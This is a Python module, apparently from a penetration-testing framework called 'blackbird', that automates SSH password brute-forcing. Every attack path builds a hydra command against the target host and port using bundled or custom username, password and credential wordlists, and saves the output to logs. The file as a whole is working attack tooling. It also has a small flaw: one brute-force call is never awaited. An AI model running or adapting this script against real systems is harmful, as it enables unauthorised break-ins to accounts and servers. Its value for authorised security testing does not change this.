from blackbird import utils
from blackbird import config
from blackbird.core.module import Module


class ModuleInstance(Module):

    TAGS = ["brute",]

    def __init__(self, target, port, service, nmap_results, output_dir, proto):
        Module.__init__(self, target, port, service, nmap_results, output_dir, proto)


    def can_run(self):
        if self.proto == 'tcp' and self.service == 'ssh':
            return True
        return False


    async def run(self):
        utils.log('Starting SSH bruteforce against %s:%s' % (self.target, self.port), 'info')
        user_list = self.get_resource_path('ssh-usernames.txt')
        pass_list = self.get_resource_path('ssh-passwords.txt')
        userpass_list = self.get_resource_path('ssh-userpass.txt')

        if not config.ONLY_CUSTOM_BRUTE:
            await self.do_bruteforce(self.get_output_path('hydra-1.log'), user_list=user_list, pass_list=pass_list)
            await self.do_bruteforce(self.get_output_path('hydra-2.log'), userpass_list=userpass_list)

        if config.CUSTOM_USER_LIST and config.CUSTOM_PASS_LIST:
            outfile = self.get_output_path('hydra_custom1.log')
            self.do_bruteforce(outfile, user_list=config.CUSTOM_USER_LIST, pass_list=config.CUSTOM_PASS_LIST)
        
        if config.CUSTOM_USERPASS_LIST:
            outfile = self.get_output_path('hydra_custom2.log')
            await self.do_bruteforce(outfile, userpass_list=config.CUSTOM_USERPASS_LIST)


    async def do_bruteforce(self, outfile, user_list=None, pass_list=None, userpass_list=None):
        if user_list and pass_list:
            cmd = "hydra -t 4 -v -L %s -P %s -I -e nsr -f ssh://%s:%s" % (user_list, pass_list, self.target,self.port)
        elif userpass_list:
            cmd = "hydra -t 4 -v -C %s -I -f ssh://%s:%s" % (userpass_list, self.target, self.port)
        output = await utils.run_cmd(cmd)
        with open(outfile, 'w') as out:
            out.write(output)
